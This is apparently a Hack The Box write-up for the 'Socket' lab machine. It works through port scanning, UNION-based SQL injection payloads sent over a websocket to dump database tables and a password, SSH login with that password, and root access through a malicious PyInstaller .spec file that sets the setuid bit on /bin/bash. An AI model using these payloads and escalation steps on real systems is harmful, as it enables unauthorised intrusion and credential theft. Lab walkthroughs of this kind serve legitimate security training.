---
tags:
title: Socket - Medium (HTB)
permalink: /Socket-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.228.216
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-14 00:20 -0500
Initiating Ping Scan at 00:20
Scanning 10.129.228.216 [4 ports]
Completed Ping Scan at 00:20, 0.39s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:20
Completed Parallel DNS resolution of 1 host. at 00:20, 0.50s elapsed
Initiating SYN Stealth Scan at 00:20
Scanning 10.129.228.216 [65535 ports]
Discovered open port 22/tcp on 10.129.228.216
Discovered open port 80/tcp on 10.129.228.216
Discovered open port 5789/tcp on 10.129.228.216
Discovered open port 5789/tcp on 10.129.228.216
Completed SYN Stealth Scan at 00:21, 17.88s elapsed (65535 total ports)
Nmap scan report for 10.129.228.216
Host is up, received echo-reply ttl 63 (1.7s latency).
Scanned at 2026-02-14 00:20:47 EST for 18s
Not shown: 44830 closed tcp ports (reset), 20702 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
5789/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
           Raw packets sent: 166023 (7.305MB) | Rcvd: 57096 (2.284MB)
-e [*] IP: 10.129.228.216
[*] Puertos abiertos: 22,80,5789
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80,5789 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-14 00:21 -0500
Nmap scan report for 10.129.228.216
Host is up (1.7s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://qreader.htb/
5789/tcp open  http    websockets 10.4 (Python 3.10)
|_http-title: Site doesn't have a title (text/plain).
|_http-server-header: Python/3.10 websockets/10.4
Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.94 seconds
```

![[Pasted image 20260214022234.png]]

```bash 
gobuster dir -u http://qreader.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 -q
report               (Status: 200) [Size: 4161]
reader               (Status: 405) [Size: 153]
embed                (Status: 405) [Size: 153]
```


![[Pasted image 20260214022349.png]]

![[Pasted image 20260214022358.png]]

![[Pasted image 20260214022443.png]]

![[Pasted image 20260214023730.png]]

```bash
7z l QReader_lin_v0.0.2.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 107679534 bytes (103 MiB)

Listing archive: QReader_lin_v0.0.2.zip

--
Path = QReader_lin_v0.0.2.zip
Type = zip
Physical Size = 107679534

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-11-23 09:21:22 D....            0            0  app
2022-11-23 09:18:06 .....    108587072    107678542  app/qreader
2022-11-23 09:21:23 .....          541          532  app/test.png
------------------- ----- ------------ ------------  ------------------------
2022-11-23 09:21:23          108587613    107679074  2 files, 1 folders
```

![[Pasted image 20260214024002.png]]

![[Pasted image 20260214032017.png]]

![[Pasted image 20260214032631.png]]

```bash
wscat -c ws://10.129.228.216:5789/version
Connected (press CTRL+C to quit)
> {"version": "test"}
< {"message": "Invalid version!"}
Disconnected (code: 1000, reason: "")
```

![[Pasted image 20260214041455.png]]

```bash
 cat /etc/hosts
127.0.0.1	localhost ws.qreader.htb
127.0.1.1	kali.zsln.com	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.232.100 icinga.cerberus.local cerberus.local DC.cerberus.local DC
172.16.22.1 DC.cerberus.local cerberus.local DC
10.129.228.216 socket.htb qreader.htb
```


![[Pasted image 20260214034834.png]]

![[Pasted image 20260214034851.png]]

```bash
{"version":

 "TEST\" UNION SELECT GROUP_CONCAT(tbl_name),'test',3,4 FROM sqlite_master WHERE type='table'-- -"

}
```

![[Pasted image 20260214035539.png]]

```bash
{

 "version": "TEST\" UNION SELECT group_concat(id || '|' || username || '|' || password), 'test', 3, 4 FROM users-- -"

}
```


![[Pasted image 20260214040046.png]]


![[Pasted image 20260214040221.png]]

```bash
{

 "version": "TEST\" UNION SELECT sql, 'test', 3, 4 FROM sqlite_master WHERE tbl_name='reports'-- -"

}

{"message": {"id": "CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE)", "version": "test", "released_date": 3, "downloads": 4}}


```

```bash
{

 "version": "TEST\" UNION SELECT group_concat(reporter_name || '|' || subject || '|' || description), 'test', 3, 4 FROM reports-- -"

}
```

```bash
{"message": {"id": "Jason|Accept JPEG files|Is there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it?,Mike|Converting non-ascii text|When I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this.", "version": "test", "released_date": 3, "downloads": 4}}
```



```bash
{

 "version": "TEST\" UNION SELECT sql, 'test', 3, 4 FROM sqlite_master WHERE tbl_name='info'-- -"

}




"message": {"id": "CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT)", "version": "test", "released_date": 3, "downloads": 4}}
```


tabals answres

```bash
{
 "version": "TEST\" UNION SELECT sql, 'test', 3, 4 FROM sqlite_master WHERE tbl_name='answers'-- -"
}



{"message": {"id": "CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))", "version": "test", "released_date": 3, "downloads": 4}}
```



```bash

{

 "version": "TEST\" UNION SELECT group_concat(answered_by || ' -> ' || answer), 'test', 3, 4 FROM answers-- -"

}



{"message": {"id": "admin -> Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller,admin -> Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "version": "test", "released_date": 3, "downloads": 4}}
```

```bash
nxc ssh qreader.htb -u users -p denjanjade122566
SSH         10.129.228.216  22     qreader.htb      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.129.228.216  22     qreader.htb      [-] thomas.keller:denjanjade122566
SSH         10.129.228.216  22     qreader.htb      [-] thomas.k:denjanjade122566
SSH         10.129.228.216  22     qreader.htb      [+] tkeller:denjanjade122566  Linux - Shell access!
```


```bash
 ssh tkeller@qreader.htb
tkeller@qreader.htb's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 14 07:11:19 AM UTC 2026

  System load:           0.0
  Usage of /:            56.5% of 8.51GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.129.228.216
  IPv6 address for eth0: dead:beef::250:56ff:fe95:30fa


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


tkeller@socket:~$ cat user.txt
51d2c580b4bcacd41c7c68c34ed5f820
```

```bash
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

### El Punto Débil: PyInstaller y archivos `.spec`

El script `/usr/local/sbin/build-installer.sh` utiliza **PyInstaller**. Si te fijas en la sección `action == 'build'`, el script acepta un archivo con extensión `.spec` y lo ejecuta así: `/home/svc/.local/bin/pyinstaller $name`

**¿Por qué esto es peligroso?** Los archivos `.spec` de PyInstaller son en realidad **scripts de Python**. Cuando PyInstaller lee un archivo `.spec`, ejecuta el código que contiene. Como el script de bash corre con `sudo`, PyInstaller correrá como **root**, y cualquier código dentro del `.spec` también será root.

```bash
tkeller@socket:/tmp$ nano exploit.spec
tkeller@socket:/tmp$ chmod +x exploit.spec
tkeller@socket:/tmp$ cat exploit.spec
import os
os.system("chmod u+s /bin/bash")
```

```bash
tkeller@socket:/tmp$ sudo /usr/local/sbin/build-installer.sh build exploit.spec
412 INFO: PyInstaller: 5.6.2
412 INFO: Python: 3.10.6
413 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
416 INFO: UPX is not available.
tkeller@socket:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

```bash
tkeller@socket:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
tkeller@socket:/tmp$ bash -p
bash-5.1# whoami
root
```

```bash
bash-5.1# cat root.txt
ad4cefd987723cd3c109d7b587020d94
```